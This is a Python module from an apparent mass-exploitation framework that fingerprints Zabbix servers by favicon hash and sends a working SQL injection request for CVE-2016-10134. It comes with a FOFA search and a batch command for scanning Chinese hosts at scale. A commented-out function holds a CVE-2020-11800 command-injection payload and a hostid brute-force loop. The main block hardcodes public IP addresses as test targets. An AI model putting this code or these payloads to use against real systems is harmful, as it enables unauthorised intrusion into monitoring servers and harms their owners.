# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-15 11:58

import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: app="ZABBIX-监控系统" && country="CN"
# python batch.py -m exploit.web.Zabbix.sql_injection -cs -fs "app=\"ZABBIX-监控系统\" && country=\"CN\""

class Script(BaseScript):
    name = 'Zabbix'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SQLINJECTION
        # 编号
        self.bugNumber = 'CVE-2016-10134'
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2%273297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['0fbe700fd7d07ec8d30ef8b3ac261484']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Zabbix Finger', url))
                                return {'name': 'Zabbix Finger', 'url': url, 'software': 'Zabbix'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    text = await response.text()
                    await asyncio.sleep(2)
                    if response is not None and 'SQL syntax' in text:
                        tqdm.write(Fore.RED + '[{}] {}'.format('Zabbix Sql Injection', url))
                        return {'name': 'Zabbix Sql Injection', 'url': url, 'software': 'Zabbix'}
        except Exception:
            return None

    #     def CVE_2020_11800(self):
    #         '''
    #         Zabbix Server trapper命令注入漏洞
    #         参考链接：https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800
    #         :return:
    #         '''
    #
    #         def send(ip, data):
    #             conn = socket.create_connection((ip, 10051), 10)
    #             conn.send(json.dumps(data).encode())
    #             data = conn.recv(2048)
    #             conn.close()
    #             return data
    #
    #         host = urlparse(self.url).netloc.split(':')[0]
    #         print(host)
    #         try:
    #             print(send(host, {"request": "active checks", "host": "vulhub", "ip": "ffff:::;touch /tmp/success2"}))
    #             for i in range(10000, 10500):
    #                 data = send(host, {"request": "command", "scriptid": 1, "hostid": str(i)})
    #                 if data and b'failed' not in data:
    #                     print('hostid: %d' % i)
    #                     print(data)
    #         except Exception as e:
    #             # print(e.args)
    #             return False

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://47.92.74.171:8080/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # sem = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
